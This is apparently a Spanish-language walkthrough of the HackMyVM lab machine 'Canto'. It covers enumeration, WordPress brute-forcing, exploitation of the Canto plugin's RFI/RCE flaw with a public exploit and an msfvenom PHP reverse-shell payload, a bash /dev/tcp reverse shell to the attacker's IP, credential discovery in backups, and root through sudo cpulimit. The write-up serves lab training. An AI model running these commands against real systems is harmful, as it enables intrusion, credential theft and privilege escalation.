---
tags:
  - Cybersecurity
  - Labs
  - HackMyVM
  - Easy
  - Linux
  - HTTP
  - WordPress
  - Searchsploit
  - Sudo
---
- [[#Enumeración|Enumeración]]
	- [[#Enumeración#Ping|Ping]]
	- [[#Enumeración#Nmap|Nmap]]
	- [[#Enumeración#HTTP|HTTP]]
		- [[#HTTP#Fuzzing Web|Fuzzing Web]]
- [[#Explotación|Explotación]]
	- [[#Explotación#Wpscan|Wpscan]]
	- [[#Explotación#Searchsploit|Searchsploit]]
	- [[#Explotación#Sudo|Sudo]]

---
# Resolviendo la máquina Canto

>En esta publicación, comparto cómo resolví la máquina **Canto** de [HackMyVM](https://hackmyvm.eu/machines/?v=canto).

---
## Enumeración
### Ping

Ejecutamos un *ping* para comprobar la conectividad y obtener pistas sobre el sistema operativo.

`ping -c 1 192.168.1.134`

![[Pasted image 20250718190749.png]]

*TTL=64* -> **Linux**
### Nmap

`nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.134 -oG allPorts`

![[Pasted image 20250718190922.png]]

`nmap -p22,80 -sCV 192.168.1.134 -oN targeted`

![[Pasted image 20250718191000.png]]
### HTTP

![[Pasted image 20250718191056.png]]
#### Fuzzing Web

`gobuster dir -u http://192.168.1.134/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt`

![[Pasted image 20250718191312.png]]

`http://192.168.1.134/wp-admin`

![[Pasted image 20250718191355.png]]

---
## Explotación
### Wpscan

`wpscan --url http://192.168.1.134/ --enumerate u,vp`

![[Pasted image 20250718191617.png]]
![[Pasted image 20250718191655.png]]

`wpscan --url http://192.168.1.134/ --passwords /usr/share/wordlists/rockyou.txt --usernames erik`

![[Pasted image 20250718191856.png]]
![[Pasted image 20250718194733.png]]

Al no tener resultados con la fuerza bruta, se procede a buscar *plugins*.

`wpscan --url http://192.168.1.134/ --plugins-detection aggressive -t 50`

![[Pasted image 20250718195237.png]]
![[Pasted image 20250718195337.png]]

Se identifica el plugin vulnerable **Canto** en **WordPress**, el cual presenta una vulnerabilidad de *Remote File Inclusion (RFI)* y *Remote Code Execution (RCE)*.

`searchsploit Canto`

![[Pasted image 20250718195518.png]]
### Searchsploit

`searchsploit -m 51826`

![[Pasted image 20250718195539.png]]

Se crea un *payload malicioso* para **PHP**.

`msfvenom -p php/reverse_php LHOST=192.168.1.127 LPORT=1234 -f raw > pwned.php`

Nos ponemos en escucha en el puerto 444.

`nc -nlvp 1234`

Se ejecuta el exploit descargado.

`python3 51826.py -u http://192.168.1.134/ -LHOST 192.168.1.127 -s pwned.php`

![[Pasted image 20250718202749.png]]

![[Pasted image 20250718202808.png]]

Se establece una *reverse shell* para mantener el acceso persistente.

`nc -nlvp 1235`

`bash -c "sh -i >& /dev/tcp/192.168.1.127/1235 0>&1"`

![[Pasted image 20250718202900.png]]

Una vez obtenida la *reverse shell* en la máquina víctima, se procede a realizar una búsqueda.

`cat /etc/passwd`

![[Pasted image 20250718203418.png]]

Accedemos al directorio: `/home/erik/notes`.

`cd /home/erik/notes`

Se encuentran los archivos: `Day1.txt` y `Day2.txt`.

`cat Day1.txt`

![[Pasted image 20250718203618.png]]

`cat Day2.txt`

![[Pasted image 20250718203639.png]]

Se realiza una búsqueda para encontrar los *backups*.

`find / -name backups 2>/dev/null`

![[Pasted image 20250718203913.png]]

`cd /var/wordpress/backups/`

Se encuentra el archivo: `12052024.txt`.

`cat 12052024.txt`

![[Pasted image 20250718204036.png]]

`su erik`

![[Pasted image 20250718204108.png]]
### Sudo

`sudo -l`

![[Pasted image 20250718204504.png]]

Se observa: `/usr/bin/cpulimit`.

Se realiza una búsqueda en [GTFOBins](https://gtfobins.github.io/gtfobins/cpulimit/).

![[Pasted image 20250718204643.png]]

`sudo cpulimit -l 100 -f /bin/sh`

![[Pasted image 20250718204731.png]]

---